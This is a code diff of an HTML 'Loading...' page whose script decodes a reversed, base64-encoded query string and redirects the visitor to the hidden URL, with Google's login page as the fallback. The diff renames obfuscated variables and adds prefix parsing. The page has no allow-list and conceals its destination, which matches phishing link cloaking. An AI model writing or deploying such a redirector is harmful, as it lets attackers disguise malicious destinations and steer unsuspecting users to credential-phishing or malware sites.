@@ -5,20 +5,19 @@
   <title>Loading...</title>
   <script>
     window.onload = function () {
-      const _0x = s => s.split('').reverse().join('');
-      const _1x = x => {
-        try {
-          return new URL(x), true;
-        } catch {
-          return false;
-        }
+      const reverse = s => s.split('').reverse().join('');
+      const isUrl = u => {
+        try { new URL(u); return true; } catch { return false; }
       };
-      const _q = window.location.search.slice(1); // get query string without "?"
+      const query = window.location.search.slice(1);
       try {
-        const _decoded = atob(_0x(decodeURIComponent(_q)));
-        window['location']['href'] = _1x(_decoded) ? _decoded : 'https://www.google.com/login';
+        const b64 = reverse(decodeURIComponent(query));
+        const raw = atob(b64);
+        const parts = raw.includes("::") ? raw.split("::")[1] : raw;
+        const finalUrl = decodeURIComponent(parts);
+        window.location.href = isUrl(finalUrl) ? finalUrl : 'https://www.google.com/login';
       } catch (e) {
-        window['location']['href'] = 'https://www.google.com/login';
+        window.location.href = 'https://www.google.com/login';
       }
     };
   </script>
